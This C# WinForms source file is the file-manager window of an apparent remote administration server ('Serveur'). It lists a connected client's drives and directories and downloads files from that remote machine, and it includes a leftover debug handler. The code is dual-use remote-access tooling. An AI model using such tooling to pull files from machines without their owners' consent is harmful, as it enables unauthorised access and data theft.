using Serveur.Controllers;
using Serveur.Controllers.Server;
using Serveur.Models;
using Serveur.Packets.ServerPackets;
using System;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using static Serveur.Controllers.FrmFileManagerController;

namespace Serveur.Views
{
    public partial class FrmFileManager : Form
    {
        private readonly ClientMosaic _client;
        private string _currentDir;
        private static readonly Random _rnd = new Random(Environment.TickCount);
        private const int TRANSFER_STATUS = 2;
        private const int TRANSFER_TYPE = 1;
        private const int TRANSFER_ID = 0;

        public FrmFileManager(ClientMosaic client)
        {
            _client = client;
            _client.value.frmFm = this;
            InitializeComponent();
            ListViewItem lvi = new ListViewItem(new string[] { "", "", "", "" });
            lvTransfers.Items.Add(lvi);
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            new GetDrives().Execute(_client);
        }

        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_client.value != null)
            {

                foreach (ListViewItem transfer in lvTransfers.Items)
                {
                    if (!transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Downloading") &&
                        !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Uploading") &&
                        !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Pending")) continue;

                    int id = int.Parse(transfer.SubItems[TRANSFER_ID].Text);

                    if (transfer.SubItems[TRANSFER_TYPE].Text == "Download")
                    {
                        if (_client != null)
                            new DoDownloadFileCancel(id).Execute(_client);
                        if (!canceledDownloads.ContainsKey(id))
                            canceledDownloads.Add(id, "canceled");
                        if (renamedFiles.ContainsKey(id))
                            renamedFiles.Remove(id);
                        updateTransferStatus(transfer.Index, "Canceled", 0);
                    }
                    else if (transfer.SubItems[TRANSFER_TYPE].Text == "Upload")
                    {
                        //if (!CanceledUploads.ContainsKey(id))
                        //    CanceledUploads.Add(id, "canceled");
                        //UpdateTransferStatus(transfer.Index, "Canceled", 0);
                    }
                }


                _client.value.frmFm = null;
            }
        }

        public void addDrives(RemoteDrive[] drives)
        {
            try
            {
                cboDrives.Invoke((MethodInvoker)delegate
                {
                    cboDrives.DisplayMember = "DisplayName";
                    cboDrives.ValueMember = "RootDirectory";
                    cboDrives.DataSource = new BindingSource(drives, null);
                });
            }
            catch (InvalidOperationException)
            {

            }
        }

        private void cboDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (_client != null && _client.value != null)
            {
                setCurrentDir(cboDrives.SelectedValue.ToString());
                refreshDirectory();
            }
        }

        public void setStatus(string text, bool setLastDirectorySeen = false)
        {
            try
            {
                if (_client.value != null && setLastDirectorySeen)
                {
                    setCurrentDir(Path.GetFullPath(Path.Combine(_currentDir, @"..\")));
                    _client.value.receivedLastDirectory = true;
                }
                statusStrip.Invoke((MethodInvoker)delegate
                {
                    stripLblStatus.Text = "Status: " + text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void setCurrentDir(string path)
        {
            _currentDir = path;
            try
            {
                txtPath.Invoke((MethodInvoker)delegate
                {
                    txtPath.Text = _currentDir;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private string getAbsolutePath(string item)
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.Length == 1)
                    return Path.Combine(_currentDir, item);
                else
                    return Path.Combine(_currentDir + '/', item);
            }

            return Path.GetFullPath(Path.Combine(_currentDir, item));
        }

        private void navigateUp()
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.LastIndexOf('/') > 0)
                {
                    _currentDir = _currentDir.Remove(_currentDir.LastIndexOf('/') + 1);
                    _currentDir = _currentDir.TrimEnd('/');
                }
                else
                    _currentDir = "/";

                setCurrentDir(_currentDir);
            }
            else
                setCurrentDir(getAbsolutePath(@"..\"));
        }

        private void refreshDirectory()
        {
            if (_client == null || _client.value == null) return;

            if (!_client.value.receivedLastDirectory)
            {
                _client.value.processingDirectory = false;
            }

            new GetDirectory(_currentDir).Execute(_client);
            setStatus("Loading directory content...");
            _client.value.receivedLastDirectory = false;
        }

        public void clearFileBrowser()
        {
            try
            {
                lvDirectory.Invoke((MethodInvoker)delegate
                {
                    lvDirectory.Items.Clear();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void addItemToFileBrowser(string name, string size, PathType type, int imageIndex)
        {
            try
            {
                ListViewItem lvi = new ListViewItem(new string[] { name, size, (type != PathType.Back) ? type.ToString() : string.Empty })
                {
                    Tag = type,
                    ImageIndex = imageIndex
                };

                lvDirectory.Invoke((MethodInvoker)delegate
                {
                    lvDirectory.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void lvDirectory_DoubleClick(object sender, EventArgs e)
        {
            if(_client != null && _client.value != null && lvDirectory.SelectedItems.Count > 0)
            {
                PathType type = (PathType)lvDirectory.SelectedItems[0].Tag;

                switch (type)
                {
                    case PathType.Back:
                        navigateUp();
                        refreshDirectory();
                        break;
                    case PathType.Directory:
                        setCurrentDir(getAbsolutePath(lvDirectory.SelectedItems[0].SubItems[0].Text));
                        refreshDirectory();
                        break;
                }
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach(ListViewItem files in lvDirectory.SelectedItems)
            {
                PathType type = (PathType)files.Tag;

                if(type == PathType.File)
                {
                    string path = getAbsolutePath(files.SubItems[0].Text);

                    int uniqId = getNewTransferId(files.Index);

                    if(_client  != null)
                    {
                        new DoDownloadFile(path, uniqId).Execute(_client);

                        addTransfer(uniqId, "Download", "Pending...", files.SubItems[0].Text);
                    }
                }
            }
        }

        public static int getNewTransferId(int o = 0)
        {
            return _rnd.Next(0, int.MaxValue) + o;
        }

        public void addTransfer(int uniqId, string type, string status, string filename)
        {
            try
            {
                ListViewItem lvi =
                  new ListViewItem(new string[] {uniqId.ToString(), type, status, filename });

                lvDirectory.Invoke((MethodInvoker)delegate
                {
                    lvTransfers.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }


        public void updateTransferStatus(int index, string status, int imageIndex)
        {
            try
            {
                lvTransfers.Invoke((MethodInvoker)delegate
                {
                    lvTransfers.Invoke((MethodInvoker)delegate
                    {
                        lvTransfers.Items[index].SubItems[TRANSFER_STATUS].Text = status;
                    });

                });
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception)
            {
            }
        }

        public int getTransferIndex(int id)
        {
            string strId = id.ToString();
            int index = 0;

            try
            {
                lvTransfers.Invoke((MethodInvoker)delegate
                {
                    foreach (ListViewItem lvi in lvTransfers.Items.Cast<ListViewItem>().Where(lvi => lvi != null && strId.Equals(lvi.SubItems[TRANSFER_ID].Text)))
                    {
                        index = lvi.Index;
                        break;
                    }
                });
            }
            catch (InvalidOperationException)
            {
                return -1;
            }

            return index;
        }

        private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lvTransfers.SelectedItems)
            {
                if (!transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Downloading") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Uploading") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Pending")) continue;

                int id = int.Parse(transfer.SubItems[TRANSFER_ID].Text);

                if (transfer.SubItems[TRANSFER_TYPE].Text == "Download")
                {
                    if (_client != null)
                        new DoDownloadFileCancel(id).Execute(_client);
                    if (!canceledDownloads.ContainsKey(id))
                            canceledDownloads.Add(id, "canceled");
                    if (renamedFiles.ContainsKey(id))
                        renamedFiles.Remove(id);
                    updateTransferStatus(transfer.Index, "Canceled", 0);
                }
                else if (transfer.SubItems[TRANSFER_TYPE].Text == "Upload")
                {
                    //if (!CanceledUploads.ContainsKey(id))
                    //    CanceledUploads.Add(id, "canceled");
                    //UpdateTransferStatus(transfer.Index, "Canceled", 0);
                }
            }
        }

        private void testToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //_client.value.ttttest = true;
            MessageBox.Show("salut");
            new DoDownloadFileCancel(41).Execute(_client);
        }
    }
}
